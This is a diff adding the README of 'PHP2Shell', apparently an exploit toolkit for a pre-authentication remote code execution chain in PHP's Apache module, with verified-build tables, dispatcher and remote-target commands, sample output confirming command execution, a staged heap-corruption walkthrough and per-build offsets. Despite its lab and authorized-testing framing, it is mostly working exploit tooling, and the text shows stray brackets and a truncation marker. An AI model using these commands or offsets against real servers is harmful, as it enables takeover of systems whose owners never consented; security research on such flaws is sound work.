@@ -1,0 +1,161 @@
+PHP2Shell
+
+Pre-auth RCE research toolkit for CVE-2026-109618 / CVE-2026-109619
+
+exploit by devploit
+
+Verified run against the local PHP 8.5.11 laboratory: uid=33(www-data).
+
+Authorized testing only. Use this material exclusively against systems you
+own or have explicit, written permission to test. It is not a scanning tool,
+it ships no target list, and it must not be used against third-party
+infrastructure. The chain is disruptive: it sends large request bodies,
+triggers pre-RINIT out-of-memory conditions and kills Apache children.
+
+PHP2Shell is a research workspace for the session.upload_progress OOM /
+stale-pointer chain in PHP's Apache module. It packages a version-aware
+dispatcher, a per-build profile engine, reproducible laboratories, a calibration
+factory and runtime instrumentation around the public research exploit by
+9bie.
+
+The goal is reproducible research and defensive validation, not mass
+exploitation. The dispatcher refuses to guess: it stops when the build has no
+verified profile, when the target is a fixed release, or when the target OS does
+not match the profile.
+
+Status
+
+| Build | Image | Profile | Heap leak | libphp leak | RCE | Notes |
+| --- | --- | --- | --- | --- | --- | --- |
+| PHP 8.5.11 aarch64 | php:8.5.11-apache | php-8.5.11-bookworm-aarch64 | yes | yes | yes | uid=33(www-data) |
+| PHP 8.5.11 amd64 | php:8.5.11-apache | php-8.5.11-bookworm-amd64 | yes | yes | yes | separate offsets, same htdata |
+| PHP 8.5.10 aarch64 | php:8.5.10-apache | php-8.5.10-bookworm-aarch64 | yes | yes | yes | uid=33(www-data) |
+| PHP 8.4.26 amd64 | php:8.4.26-apache | php-8.4.26-bookworm-amd64 | yes | yes | yes | reference build |
+| PHP 8.4.25 aarch64 | php:8.4.25-apache | php-8.4.25-bookworm-aarch64 | yes | yes | yes | probabilistic stage 3; retries |
+| PHP 8.5.0 aarch64 | php:8.5.0-apache | php-8.5.0-bookworm | yes | yes | no | stage-3 layout not found |
+| PHP 8.3.35 aarch64 | php:8.3.35-apache | php-8.3.35-bookworm-aarch64 | yes | yes | no | stage-3 reference alive |
+| PHP 8.3.33 mod_php | wordpress:7.1.1-apache | php-8.3.33-wordpress-mod_php | yes | yes | no | stage-3 reference alive |
+| PHP 8.3.0 aarch64 | php:8.3.0-apache | php-8.3.0-bookworm | no | no | no | PS(id) dangling; cookie not reclaimed |
+| PHP 8.2.34 aarch64 | php:8.2.34-apache | php-8.2.34-bookworm-aarch64 | no | no | no | UAF; leak shape differs |
+| PHP 8.1.34 aarch64 | php:8.1-apache | php-8.1.34-bookworm-aarch64 | no | no | no | UAF; leak shape differs |
+| PHP 8.0.30 aarch64 | php:8.0-apache | php-8.0.30-bookworm-aarch64 | no | no | no | UAF; leak shape differs |
+| PHP 7.4.33 aarch64 | php:7.4-apache | php-7.4.33-bookworm-aarch64 | no | no | no | UAF; leak shape differs |
+| PHP 8.2.0 aarch64 | php:8.2.0-apache | — (offsets only) | n/a | n/a | no | no heap profile |
+
+13 heap profiles, 5 with verified RCE. Offsets extracted for 12 builds.
+
+Heap leak is stage 1, libphp leak is stage 2 and RCE is a real command
+proof on an isolated lab. no means not verified, not necessarily impossible;
+n/a means no heap profile exists for that build. The 8.2.0 row is an
+offsets-only entry. All yes rows use the lab configuration: Apache prefork
+mod_php, one worker, display_errors=On, memory_limit=8M and
+session.upload_progress=On. Per-image offsets and libphp sha256 are in
+the offset inventory. The 8.4.25 profile needs the
+default retries because its stage 3 is probabilistic.
+
+Features
+
+- Version-aware dispatch — fingerprints the target, rejects fixed releases,
+  selects the exact build profile and passes offsets, htdata and heap
+  parameters explicitly. --php-version covers servers that hide their version;
+  --arch selects aarch64 or amd64 (auto-detected for local containers,
+  required for remote targets), and --profile forces an exact build.
+- Memory-limit probe — one request reveals the target memory_limit from
+  the fatal message; the chain then runs once instead of sweeping every value.
+- Worker pinning — keeps N-1 prefork workers busy with idle keep-alive
+  connections so the whole chain lands on one process. Automatic for loopback
+  laboratories; opt-in for remote infrastructure.
+- Proof handling — reads the container's /out mount for local targets, or
+  fetches a web-accessible output path for remote targets. --fetch and
+  --no-fetch override it.
+- Command staging — on local labs -c accepts commands of any length,
+  stages them in /out/c and captures the output. --script and --interactive
+  provide batch and REPL modes.
+- Calibration factory — php2shell_calibrate.py discovers stages 1-2 and
+  verifies stage 3 with a real proof before writing rce: true;
+  php2shell_matrix.py runs the factory over a matrix of images.
+- Laboratories and instrumentation — disposable labs per build, /proc
+  memory oracle, gdb recipes and offset extraction for arbitrary images.
+
+Quick start
+
+Requirements: Python 3.11+, Docker (for the labs), Linux or macOS on arm64 or
+amd64. Fetch the pinned upstream:
+
+python3 tools/bootstrap_upstream.py
+
+The script clones the public 9bie research into vendor/php2shell-upstream and
+checks out the pinned commit. The toolkit applies the minimal SNI and
+heap-parameter changes in place at runtime; they are documented in
+docs/upstream-changes.md. No patch file is
+redistributed.
+
+Start the local laboratories and run the dispatcher against the PHP 8.4.26 lab:
+
+python3 tools/php2shell_labs.py up
+python3 tools/php2shell_auto.py \
+  -u http://127.0.0.1:8105/index.php \
+  --container p2s-lab-8426 \
+  --repo-dir vendor/php2shell-upstream
+
+Expected shape:
+
+exploit by devploit  ·  CVE-2026-109618 / CVE-2026-109619
+  automatic target detection, build profile dispatch and command execution
+  authorized testing only
+
+*] CHAIN 01/01  automatic target detection / fixed command proof
+00:00.00  DISCOVER   http://127.0.0.1:8105/index.php
+00:00.01  OK         PHP 8.4.26  ·  Apache/2.4.69 (Debian)
+00:00.01  PREFLIGHT  php-8.4.26-bookworm-amd64
+00:00.15  PROBE      memory_limit probe: 16 MiB body
+00:00.16  OK         detected memory_limit=8M
+00:00.17  EXECUTE    memory_limit=8M  ·  huge_mb=12
+   │ [+] chunk base = 0x7ffffc400000
+   │ [+] libphp base = 0x7ffffe013000
+   │ PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+╭─ RESULT ─────────────────────────────────────────────────────────╮
+│ PRE-AUTH RCE CONFIRMED                                           │
+╰──────────────────────────────────────────────────────────────────╯
+
+Useful entry points:
+
+python3 tools/php2shell_auto.py --list          # profiles and RCE status
+python3 tools/php2shell_auto.py -u  --dry-run --no-color
+python3 tools/php2shell_auto.py -u  --php-version 8.4.26 --arch amd64 --allow-remote
+python3 tools/php2shell_labs.py status
+python3 tools/php2shell_inventory.py
+
+How it works
+
+The chain abuses the session.upload_progress callback that runs before
+the request startup (pre-RINIT) and therefore before the target script:
+
+1. Stage 1 — heap leak. A multipart request drives the parser into an
+   out-of-memory bailout after php_session_track_init() built the session
+   state. The next request reuses the stale PS(id) and returns a
+   Set-Cookie whose value contains heap pointers, revealing the Zend MM chunk
+   base.
+2. Stage 2 — libphp leak. The same stale-state primitive is reshaped to
+   disclose a pointer into libphp.so, revealing its load base.
+3. Stage 3 — control flow. A forged HashTable/reference lands on the stale
+   session state; the zval_ptr_dtor path calls zif_system with a short
+   command carried in a fake zend_string.
+
+The full technical write-up, including the session lifecycle and the heap
+grooming, is in [docs/php2shell-analysis.md.
+
+A profile is per build:
+
+{
+  "libphp": { "zif_system": "0x465370", "zval_ptr_dtor": "0x65eb60", "htdata": "0x690d8" },
+  "stages": { "stage1_n": 841, "stage1_forge_len": 79, "stage2_t": 406,
+              "stage2_v": 16, "stage3_pads": [31, 31]], "stage3_carrier": true },
+  "oom_mb": 12,
+  "rce": true
+}
+
+Architecture selection
+
+…（内容已截断）
